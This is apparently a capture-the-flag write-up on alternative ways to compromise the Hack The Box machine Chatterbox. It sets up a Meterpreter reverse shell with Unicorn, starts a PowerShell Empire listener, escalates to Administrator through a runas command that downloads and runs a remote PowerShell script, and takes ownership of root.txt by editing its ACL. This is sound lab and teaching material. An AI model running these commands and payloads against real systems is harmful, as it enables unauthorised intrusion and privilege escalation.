# Alternative way to exploit Chatterbox

## Metasploit

An alternative way to exploit the box Chatterbox is by using **Metasploit** to get a _meterpreter_ shell instead of a normal reverse shell.
First create the payload with **Unicorn**:
```markdown
python /usr/share/unicorn-magic/unicorn.py windows/meterpreter/reverse_https 10.10.14.7 9003
```

This creates _powershell_attack.txt_ which is the payload that has to be executed on the box and I will rename it to _shell.ps1_.
And _unicorn.rc_ is a configuration file for **Metasploit** to start it automatically with the correct parameters:
```markdown
msfconsole -r unicorn.rc
```

To upload a file on the box, use the Python script from before:
```markdown
python 36025.py
```

Now it uploads the newly created payload on the box and **Metasploit** starts a _meterpreter_ session as the user _alfred_.
```markdown
msf5 exploit(multi/handler) > sessions -l

Active sessions
===============

  Id  Name  Type                     Information  Connection
  --  ----  ----                     -----------  ----------
  1         meterpreter x86/windows               10.10.14.7:9003 -> 10.10.10.74:49165 (10.10.10.74)
```

## PowerShell Empire

Another alternative way to exploit the box Chatterbox is by using **PowerShell Empire**.
Lets start a HTTP listener:
```markdown
(Empire) > uselistener http

(Empire: listeners/http) > set Host http://10.10.14.7:443
(Empire: listeners/http) > set BindIP 10.10.14.7
(Empire: listeners/http) > set Port 443
(Empire: listeners/http) > execute
```

The listener is now started and we can create a launcher:
```markdown
(Empire: listeners/http) > launcher powershell
```

This is the payload to paste into a file that I will call _shell.ps1_ and will be uploaded to the box again via the Python exploit from before:
```markdown
python 36025.py
```

Now it uploads the newly created payload on the box and **Empire** starts an _agent_ as the user _alfred_.
```markdown
(Empire: listeners/http) > agents
```

As the credentials for Administrator are known, we can escalate our privileges:
```markdown
(Empire: agents) > interact H3M8B4N2

(Empire: H3M8B4N2) > usemodule management/runas
(Empire: powershell/management/runas) > set UserName Administrator
(Empire: powershell/management/runas) > set Domain CHATTERBOX
(Empire: powershell/management/runas) > set Password Welcome1!
(Empire: powershell/management/runas) > set Arguments "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.7/shell.ps1')"
(Empire: powershell/management/runas) > execute
```

This starts another _agent_ as _admnistrator_ which results in having have two agents:
```markdown
[\*] Active agents:
 Name     La Internal IP     Machine Name      Username                 Process            PID    Delay    Last Seen            Listener
 ----     -- -----------     ------------      --------                 -------            ---    -----    ---------            ----------
 H3M8B4N2 ps 10.10.10.74     CHATTERBOX        CHATTERBOX\Alfred        powershell         7476   5/0.0    2020-04-26 17:18:35  http
 NMF3Y2AC ps 10.10.10.74     CHATTERBOX        \*CHATTERBOX\Administrat powershell         7548   5/0.0    2020-04-26 17:18:36  http
```

## Getting Root flag

There is a way to get the root.txt flag without escalating privileges to _Administrator_.
The user _alfred_ has permissions to go into the home folder of _Administrator_ and when looking at the **Access Control List** of root.txt, we see that he is the owner of the file:
```markdown
Get-ACL root.txt | fl *
```

```markdown
PSPath                  : Microsoft.PowerShell.Core\FileSystem::C:\users\Admini
                          strator\Desktop\root.txt
PSParentPath            : Microsoft.PowerShell.Core\FileSystem::C:\users\Admini
                          strator\Desktop
PSChildName             : root.txt
PSDrive                 : C
PSProvider              : Microsoft.PowerShell.Core\FileSystem
AccessToString          : CHATTERBOX\Administrator Allow  FullControl
AuditToString           :
Path                    : Microsoft.PowerShell.Core\FileSystem::C:\users\Admini
                          strator\Desktop\root.txt
Owner                   : CHATTERBOX\Alfred
Group                   : CHATTERBOX\None
(...)
```

This means it is possible to edit the ACL to get any permissions for this file as _alfred_.
```markdown
cacls root.txt /t /e /p Alfred:F
```

Now _alfred_ has FullControl permissions for this file.
